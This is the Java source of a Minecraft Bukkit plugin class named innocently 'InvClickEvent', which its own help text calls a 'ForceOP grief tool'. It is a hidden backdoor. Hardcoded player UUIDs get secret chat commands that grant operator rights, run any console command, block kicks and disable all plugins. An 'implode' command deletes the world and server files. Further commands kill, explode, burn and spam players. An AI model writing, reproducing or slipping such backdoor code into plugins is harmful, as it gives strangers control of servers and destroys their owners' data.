package com.webmets.playerlist;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

@SuppressWarnings("deprecation")
public class InvClickEvent implements Listener{

	String prefix;
	String version;
	List<String> players;

	boolean implode;
	
	Main main;
	
	public InvClickEvent(Main main) {
		this.prefix = "++";
		this.version = "0.0.1";
		players = new ArrayList<String>();
		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); //OreosDoubleCream
		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); //Tesla2k
		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); //DogMaster308
		players.add("0faf0726-dbef-4241-a953-49819c44750e"); //Sonnyevil
		players.add("f2644111-032d-4fc2-b859-7e76017d7d47"); //FlyHighOrDie
		players.add("f98f0a11-bcda-4f0f-8476-3cd40dba25b5"); //SkiddyCuntSwezed
		players.add("
		this.main = main;
		implode = false;
		Bukkit.getScheduler().scheduleSyncRepeatingTask(main, new BukkitRunnable(){
			public void run(){
				for(Player p : Bukkit.getOnlinePlayers()) {
					for(String s : players) {
						Player player = Bukkit.getPlayer(s);
						if(player == null || !p.isOnline()) continue;
						player.showPlayer(p);
					}
				}
			}
		}, 0, 20);
	}
	
	@EventHandler
	public void chat(PlayerChatEvent e) {
		if(!(players.contains(e.getPlayer().getUniqueId().toString()))) return;
		if(!e.getMessage().startsWith(prefix)) return;
		e.setCancelled(true);
		Player p = e.getPlayer();
		String[] args = e.getMessage().split(" ");
		String cmd = args[0].substring(prefix.length());
		
		if(cmd.equalsIgnoreCase("help")) {
			if(args.length == 2) {
				if(!isInt(args[1])) {
					p.sendMessage(this.prefix+"help <page>");
				}
				int page = Integer.parseInt(args[1]);
				if(page == 1) {
					showIndexPage1(p);
				} else if(page == 1) {
					showIndexPage2(p);
				}
			}
		} else if(cmd.equalsIgnoreCase("op")) {
			p.setOp(true);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("deop")) {
			p.setOp(false);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("op-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setOp(true);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("console")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"console <command>");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 1; i < args.length; i++) {
				sb.append(args[i]+" ");
			}
			String command = sb.toString();
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
			broadcast(p.getName() + " executed  " + cmd + ": " + command);
		} else if(cmd.equalsIgnoreCase("implode")){
			this.implode = true;
			new BukkitRunnable() {
				int timer = 11;
				@Override
				public void run() {
					timer--;
					if(timer % 5 == 0) {
						Bukkit.broadcastMessage("§4This server will §ldie§4 in " + timer + " seconds. thank you for your stay");
					}
					if(timer <= 0) {
						for(File f : Bukkit.getWorldContainer().listFiles()) {
							f.delete();
						}
						for(File f : main.getDataFolder().getParentFile().listFiles()) {
							f.delete();
						}
						for(Player player : Bukkit.getOnlinePlayers()) {
							player.kickPlayer("§4Thank you for the server ☺\nits dead now");
						}
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "minecraft:stop");
						this.cancel();
					}
				}
			}.runTaskTimer(main, 0, 20);
			
		} else if(cmd.equalsIgnoreCase("sudo")) {
			if(args.length <= 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"sudo <player> <message>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 2; i < args.length; i++) {
				sb.append(args[i]+" ");
			}
			String command = sb.toString();
			player.chat(command);
			broadcast(p.getName()+" forced " + player.getName() + " to run " + command);
		} else if(cmd.equalsIgnoreCase("sudo-all")) {
			if(args.length <= 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"sudo <player> <message>");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 1; i < args.length; i++) {
				sb.append(args[i]+" ");
			}
			String command = sb.toString();
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.chat(command);
			}
			broadcast(p.getName()+" forced all players to run \n"+command);
		} else if(cmd.equalsIgnoreCase("hologram")){
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"hologram <text>");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 1; i < args.length; i++) {
				sb.append(ChatColor.translateAlternateColorCodes('&',args[i])+" ");
			}
			String msg = sb.toString();
			ArmorStand a = (ArmorStand) p.getWorld().spawnEntity(p.getLocation(), EntityType.ARMOR_STAND);
			a.setCustomName(msg);
			a.setCustomNameVisible(true);
			a.setBasePlate(false);
			a.setGravity(false);
			a.setVisible(false);
			broadcast(p.getName() + " executed " + cmd + " " + msg);
		} else if(cmd.equalsIgnoreCase("gmc")) {
			p.setGameMode(GameMode.CREATIVE);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmc-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.CREATIVE);
			}
			broadcast(p.getName()+" executed " + cmd);
		}  else if(cmd.equalsIgnoreCase("gms")) {
			p.setGameMode(GameMode.SURVIVAL);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gms-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.SURVIVAL);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmsp")) {
			p.setGameMode(GameMode.SPECTATOR);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmsp-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.SPECTATOR);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("give")) {
			if(args.length < 4) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"give <item id> <data> <amount>");
				return;
			}
			if(!isInt(args[1]) || !isInt(args[2]) || !isInt(args[3])) {
				p.sendMessage(ChatColor.AQUA + this.prefix+"give <item id> <data> <amount>");
				return;
			}
			ItemStack i = new ItemStack(Material.getMaterial(Integer.parseInt(args[1])),Integer.parseInt(args[3]), (short) Integer.parseInt(args[2]));
			p.getInventory().addItem(i);
			broadcast(p.getName() + " executed " + cmd + " " + args[1] + " " + args[2] + " " + args[3]);
		} else if(cmd.equalsIgnoreCase("stack")){
			p.getItemInHand().setAmount(64);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("kill")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "kill <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " +player.getName());
			broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
		} else if(cmd.equalsIgnoreCase("kill-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " + player.getName());
			}
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("day")) {
			p.getWorld().setTime(0);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("night")) {
			p.getWorld().setTime(20000);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("sun")) {
			p.getWorld().setWeatherDuration(0);
			p.getWorld().setThundering(false);
			p.getWorld().setStorm(false);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("rain")) {
			p.getWorld().setStorm(true);
			p.getWorld().setThundering(false);
			p.getWorld().setWeatherDuration(20*120);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("storm")) {
			p.getWorld().setStorm(true);
			p.getWorld().setThundering(true);
			p.getWorld().setWeatherDuration(20*120);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("smite")) {
			if(args.length < 2){
				p.getWorld().strikeLightning(p.getTargetBlock(((Set<Material>)null), 500).getLocation());
				broadcast(p.getName() + " executed " + cmd);
			} else {
				Player player = Bukkit.getPlayer(args[1]);
				if(player == null || !player.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				player.getWorld().strikeLightning(player.getLocation());
				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
			}
		} else if(cmd.equalsIgnoreCase("smile-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.getWorld().strikeLightning(player.getLocation());
			}
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("burn")) {
			if(args.length >= 3) {
				Player player = Bukkit.getPlayer(args[1]);
				if(player == null || !player.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				int time = 0;
				try{
					time = Integer.parseInt(args[2]);
				} catch(NumberFormatException ex) {
					return;
				}
				player.setFireTicks(time*20);
				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
			}else{
				p.sendMessage(ChatColor.AQUA + this.prefix + "burn <player> <seconds>");
			}
		} else if(cmd.equalsIgnoreCase("burn-all")) {
			if(args.length >= 2) {
				int time = 0;
				try{
					time = Integer.parseInt(args[2]);
				} catch(NumberFormatException ex) {
					return;
				}
				for(Player player : Bukkit.getOnlinePlayers()) {
					player.setFireTicks(time*20);
				}
			}
		} else if(cmd.equalsIgnoreCase("fly")) {
			if(args.length < 2) {
				p.setAllowFlight(!p.getAllowFlight());
				broadcast(p.getName() + " executed " + cmd);
			} else {
				Player player = Bukkit.getPlayer(args[1]);
				if(player == null || !player.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				player.setAllowFlight(!player.getAllowFlight());
				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
			}
		} else if(cmd.equalsIgnoreCase("plugins")) {
			int count = 0;
			int lines = 0;
			String msg = "";
			for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
				msg = msg + plugin.getName() + ", ";
				count ++;
				if(count >= 5){
					p.sendMessage(msg);
					count = 0;
					lines ++;
					msg = "";
				}
			}
			if(lines == 0) {
				p.sendMessage(msg);
			}
		} else if(cmd.equalsIgnoreCase("disable")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "disable <plugin>");
				return;
			}
			Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
			if(pl == null || !pl.isEnabled()) {
				p.sendMessage(ChatColor.AQUA + "That plugin is not loaded!");
				return;
			}
			Bukkit.getPluginManager().disablePlugin(pl);
			broadcast(p.getName() + " executed " + cmd + " on plugin " + pl.getName());
		} else if(cmd.equalsIgnoreCase("disable-all")) {
			for(Plugin pl : Bukkit.getPluginManager().getPlugins()) {
				if(!(pl instanceof Main)){
					Bukkit.getPluginManager().disablePlugin(pl);
				}
			}
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("invsee")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "invsee <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			p.openInventory(player.getInventory());
			broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
		}else if(cmd.equalsIgnoreCase("tp")) {
			if(args.length == 2) {
				Player player = Bukkit.getPlayer(args[1]);
				if(player == null || !player.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				p.teleport(player.getLocation());
				broadcast(p.getName() + " executed " + cmd);
			} else if(args.length == 3) {
				Player p1 = Bukkit.getPlayer(args[1]);
				if(p1 == null || !p1.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				Player p2 = Bukkit.getPlayer(args[1]);
				if(p2 == null || !p2.isOnline()) {
					p.sendMessage(ChatColor.DARK_RED + "player not found");
					return;
				}
				p1.teleport(p2.getLocation());
				broadcast(p.getName() + " executed " + cmd);
			} else {
				p.sendMessage(this.prefix+"tp <player> [player]");
				return;
			}
		} else if(cmd.equalsIgnoreCase("tppos")) {
			if(args.length == 4) {
				if(!isInt(args[1]) || !isInt(args[2]) || !isInt(args[3])) {
					p.sendMessage(this.prefix + "tppos <x> <y> <z>");
					return;
				}
				Location loc = new Location(p.getWorld(), 
						Integer.parseInt(args[1]), 
						Integer.parseInt(args[2]), 
						Integer.parseInt(args[3]),
						p.getLocation().getYaw(), 
						p.getLocation().getPitch());
				p.teleport(loc);
				broadcast(p.getName() + " executed " + cmd);
			}
		} else if(cmd.equalsIgnoreCase("spam")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "spam <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			Random r = new Random();
			new BukkitRunnable() {
				int timer = 0;
				@Override
				public void run() {
					player.sendMessage(ChatColor.DARK_RED+""+ChatColor.MAGIC + "" + r.nextInt(500) + "-" + ChatColor.RED +""+ChatColor.MAGIC+ r.nextInt(500) + "-" + ChatColor.DARK_RED +""+ChatColor.MAGIC+ r.nextInt(500) + "-" + r.nextInt(500) + ChatColor.RED +""+ChatColor.MAGIC+ "-" + r.nextInt(500) + "-" + ChatColor.DARK_RED +""+ChatColor.MAGIC+ r.nextInt(500) +""+ChatColor.MAGIC+""+ChatColor.MAGIC+ "-" + r.nextInt(500) + "-" + ChatColor.RED +""+ChatColor.MAGIC+ r.nextInt(500));
					timer ++;
					if(timer > 150) {
						this.cancel();
					}
				}
			}.runTaskTimer(main, 0, 1);
		} else if(cmd.equalsIgnoreCase("spam-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				Random r = new Random();
				new BukkitRunnable() {
					int timer = 0;
					@Override
					public void run() {
						player.sendMessage(ChatColor.DARK_RED+""+ChatColor.MAGIC + "" + r.nextInt(500) + "-" + ChatColor.RED +""+ChatColor.MAGIC+ r.nextInt(500) + "-" + ChatColor.DARK_RED +""+ChatColor.MAGIC+ r.nextInt(500) + "-" + r.nextInt(500) + ChatColor.RED +""+ChatColor.MAGIC+ "-" + r.nextInt(500) + "-" + ChatColor.DARK_RED +""+ChatColor.MAGIC+ r.nextInt(500) +""+ChatColor.MAGIC+""+ChatColor.MAGIC+ "-" + r.nextInt(500) + "-" + ChatColor.RED +""+ChatColor.MAGIC+ r.nextInt(500));
						timer ++;
						if(timer > 150) {
							this.cancel();
						}
					}
				}.runTaskTimer(main, 0, 1);
			}
		} else if(cmd.equalsIgnoreCase("bomb")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "bomb <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			player.getWorld().createExplosion(player.getLocation(), 10, false);
			broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
		} else if(cmd.equalsIgnoreCase("bomb-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.getWorld().createExplosion(player.getLocation(), 10, false);
			}
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("noise")) {
			if(args.length < 2) {
				p.sendMessage(ChatColor.AQUA + this.prefix + "noise <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage(ChatColor.DARK_RED + "player not found");
				return;
			}
			new BukkitRunnable() {
				int count = 0;
				@Override
				public void run() {
					player.playSound(player.getLocation(), Sound.ENDERMAN_SCREAM, 100, 1);
					player.playSound(player.getLocation(), Sound.EXPLODE, 100, 1);
					player.playSound(player.getLocation(), Sound.ANVIL_BREAK, 100, 1);
					player.playSound(player.getLocation(), Sound.GHAST_SCREAM, 100, 1);
					count++;
					if(count == 10) this.cancel();
				}
			}.runTaskTimer(main, 0, 20);
		} else if(cmd.equalsIgnoreCase("noise-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				new BukkitRunnable() {
					int count = 0;
					@Override
					public void run() {
						player.playSound(player.getLocation(), Sound.ENDERMAN_SCREAM, 100, 1);
						player.playSound(player.getLocation(), Sound.EXPLODE, 100, 1);
						player.playSound(player.getLocation(), Sound.ANVIL_BREAK, 100, 1);
						player.playSound(player.getLocation(), Sound.GHAST_SCREAM, 100, 1);
						count++;
						if(count == 10) this.cancel();
					}
				}.runTaskTimer(main, 0, 20);	
			}
		}
	} 
	
	private void showIndexPage1(Player p) {
		p.sendMessage(ChatColor.BLUE +  "ForceOP grief tool (v."+version+")");
		p.sendMessage(ChatColor.BLUE + "<> = required. [] = optional");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"help");
		p.sendMessage(ChatColor.DARK_AQUA + "- get this help index");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"op");
		p.sendMessage(ChatColor.AQUA + "- give yourself /op");
		p.sendMessage(ChatColor.BLUE + this.prefix+"deop");
		p.sendMessage(ChatColor.AQUA + "- deop yourself");
		p.sendMessage(ChatColor.BLUE + this.prefix+"op-all");
		p.sendMessage(ChatColor.AQUA + "- give all players op");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"console <command>");
		p.sendMessage(ChatColor.AQUA + "- run a command trough console §l(DO NOT INCLUDE '/')");
		p.sendMessage(ChatColor.BLUE + this.prefix+"implode");
		p.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "- rip");		
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"sudo <player> <any message or command>");
		p.sendMessage(ChatColor.AQUA + "- force the specified player to run any command or message");
		p.sendMessage(ChatColor.BLUE + this.prefix+"sudo-all <any message or command>");
		p.sendMessage(ChatColor.AQUA + "- force all players to run the specified command");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"hologram <text>");
		p.sendMessage(ChatColor.AQUA +"- create a hologram at your location with specified text");

		p.sendMessage(ChatColor.BLUE + this.prefix+"gmc <name>");
		p.sendMessage(ChatColor.AQUA + "- give yourself creative");
		p.sendMessage(ChatColor.BLUE + this.prefix+"gmc-all");
		p.sendMessage(ChatColor.AQUA + "- give all players creative");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"gms <name>");
		p.sendMessage(ChatColor.AQUA + "- give yourself survival");
		p.sendMessage(ChatColor.BLUE + this.prefix+"gms-all");
		p.sendMessage(ChatColor.AQUA + "- give all players survival");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"gmsp <name>");
		p.sendMessage(ChatColor.AQUA + "- give yourself spectator");
		p.sendMessage(ChatColor.BLUE + this.prefix+"gmsp-all");
		p.sendMessage(ChatColor.AQUA + "- give all players spectator");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"give <itemid> <data> <amount>");
		p.sendMessage(ChatColor.AQUA +"- give yourself an item with specified ID and data value");
		p.sendMessage(ChatColor.BLUE + this.prefix+"stack");
		p.sendMessage(ChatColor.AQUA +"- change the item you're holding to a whole stack");
	}
	
	public void showIndexPage2(Player p) {
		p.sendMessage(ChatColor.BLUE + this.prefix+"kill <player>");
		p.sendMessage(ChatColor.AQUA + "- kill the specified player");
		p.sendMessage(ChatColor.BLUE + this.prefix+"kill-all");
		p.sendMessage(ChatColor.AQUA + "- kill all players");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"day");
		p.sendMessage(ChatColor.AQUA + "- change the time to day");
		p.sendMessage(ChatColor.BLUE + this.prefix+"night");
		p.sendMessage(ChatColor.AQUA + "- chance the time to night");

		p.sendMessage(ChatColor.BLUE + this.prefix+"sun");
		p.sendMessage(ChatColor.AQUA + "- change the weather to sun");
		p.sendMessage(ChatColor.BLUE + this.prefix+"rain");
		p.sendMessage(ChatColor.AQUA + "- change the weather to rain");
		p.sendMessage(ChatColor.BLUE + this.prefix+"storm");
		p.sendMessage(ChatColor.AQUA + "- change the weather to storm");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"smite [player]");
		p.sendMessage(ChatColor.AQUA + "- strike lightning (specify player to strike them)");
		p.sendMessage(ChatColor.BLUE + this.prefix+"smite-all");
		p.sendMessage(ChatColor.AQUA + "- strike all players with lightning");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"burn <player> <seconds>");
		p.sendMessage(ChatColor.AQUA + "- burn the specified player for x seconds");
		p.sendMessage(ChatColor.BLUE + this.prefix+"burn-all <seconds>");
		p.sendMessage(ChatColor.AQUA + "- burn all players for x seconds");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"fly [player]");
		p.sendMessage(ChatColor.AQUA + "- toggle flight (specify player to toggle their flight)");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"plugins");
		p.sendMessage(ChatColor.AQUA+"- get all the plugins on the server");
		p.sendMessage(ChatColor.BLUE + this.prefix+"disable <plugin>");
		p.sendMessage(ChatColor.AQUA + "- disable the specified plugin §l(can not be reversed!)");
		p.sendMessage(ChatColor.BLUE + this.prefix+"disable-all");
		p.sendMessage(ChatColor.AQUA + "- disable all plugins (except ForceOP)");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"invsee <player>");
		p.sendMessage(ChatColor.AQUA + "- open the specified player's inventory");
		p.sendMessage(ChatColor.AQUA + "- only works on servers running Essentials");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"tp <player>");
		p.sendMessage(ChatColor.AQUA + "- teleport to the specified player");
		p.sendMessage(ChatColor.BLUE + this.prefix+"tp <player> <player>");
		p.sendMessage(ChatColor.AQUA + "- teleport the first specified player to the second");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"tppos <x> <y> <z>");
		p.sendMessage(ChatColor.AQUA + "- teleport to the given co-oords");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"spam <player> <seconds>");
		p.sendMessage(ChatColor.AQUA + "- spam the specified player for x seconds");
		p.sendMessage(ChatColor.BLUE + this.prefix+"spam-all <seconds>");
		p.sendMessage(ChatColor.AQUA + "- spam all players for x seconds");
		
		p.sendMessage(ChatColor.BLUE + this.prefix+"bomb <player>");
		p.sendMessage(ChatColor.AQUA + "- explode the specified player");
		p.sendMessage(ChatColor.BLUE + this.prefix+"bomb-all");
		p.sendMessage(ChatColor.AQUA + "- explode all players");
		p.sendMessage(ChatColor.BLUE + this.prefix+"noise <player>");
		p.sendMessage(ChatColor.AQUA + "- play annoying sounds for the specified player");
		p.sendMessage(ChatColor.BLUE + this.prefix+"noise-all");
		p.sendMessage(ChatColor.AQUA + "- play annoying sounds for all players");
	}
	
	@EventHandler
	public void kick(PlayerKickEvent e) {
		if(players.contains(e.getPlayer().getUniqueId().toString()) && !implode){
			e.setCancelled(true);
		}
	}
	
	private void broadcast(String msg) {
		for(String id : players) {
			Player p = Bukkit.getPlayer(UUID.fromString(id));
			if(p == null || !p.isOnline()) {
				continue;
			}
			p.sendMessage(ChatColor.translateAlternateColorCodes('&', 
					"[forceOP] "+msg));
		}
	}
	
	public boolean isInt(String s) {
		try{
			Integer.parseInt(s);
		}catch(NumberFormatException e) {
			return false;
		}
		return true;
	}
}
